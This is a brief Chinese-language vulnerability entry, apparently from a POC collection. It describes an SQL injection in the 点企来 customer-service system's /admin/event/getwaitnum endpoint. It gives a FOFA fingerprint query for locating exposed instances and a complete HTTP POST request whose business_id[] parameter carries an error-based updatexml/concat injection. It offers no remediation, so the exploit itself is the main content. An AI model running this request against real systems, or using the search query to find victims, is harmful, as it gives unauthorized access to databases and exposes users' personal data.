# 点企来客服系统getwaitnum存在sql注入漏洞

点企来客服系统getwaitnum存在sql注入漏洞，攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。

## fofa

```yaml
body="layui-form-item" && body="/admin/login/check.html"
```

## poc

```java
POST /admin/event/getwaitnum HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: keep-alive
Content-Length: 84
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate, br

business_id[]=exp&business_id[]=+and+updatexml(1,concat(0x7e,md5(0x5c)),1)&groupid=1
```

![image-20240823213038237](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408232130305.png)



## 漏洞来源

- https://mp.weixin.qq.com/s/unbf6JO5U9OAqdVq8YFbuQ